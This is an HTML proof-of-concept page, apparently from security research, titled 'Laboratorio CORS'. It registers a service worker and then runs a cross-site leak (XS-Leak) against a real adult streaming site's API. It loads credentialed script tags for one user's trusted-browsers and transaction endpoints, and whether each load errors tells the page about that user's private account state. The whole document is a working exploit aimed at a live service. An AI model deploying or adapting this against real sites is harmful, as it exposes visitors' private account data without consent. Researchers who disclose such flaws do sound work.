<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Laboratorio CORS</title>
</head>

<body>

  <h1 id="2fa_result">Comprobando...</h1>
  <h1 id="t_history_results">Comprobando</h1>

  <script type="module">
      // Install service worker and wait until ready
      await navigator.serviceWorker.register("/POC/sw.js");
      (await navigator.serviceWorker.ready).active.postMessage("CLAIM");
      if (!navigator.serviceWorker.controller) {
        await new Promise((resolve) => {
          navigator.serviceWorker.addEventListener("controllerchange", resolve, { once: true });
        });
      }

      function probeError(url) {
        return new Promise((resolve, reject) => {
          let script = document.createElement('script');
          script.src = url;
          script.crossorigin = "use-credentials";
          script.onload = () => resolve(true);
          script.onerror = () => resolve(false);
          document.head.appendChild(script);
        });
      }

      // XS-Leak
      const twofa = await probeError("https://stripchat.com/api/front/users/249659168/trusted-browsers");
      const THistory = await probeError("https://stripchat.com/api/front/users/249659168/transactions?from=2026-11-01T07%3A00%3A00Z&until=2026-11-15T02%3A59%3A26Z&limit=100&offset=0");
      document.getElementById("2fa_result").textContent = twofa ? "true" : "false";
      document.getElementById("t_history_results").textContent = THistory ? "true" : "false";    
  </script>

</body>
</html>
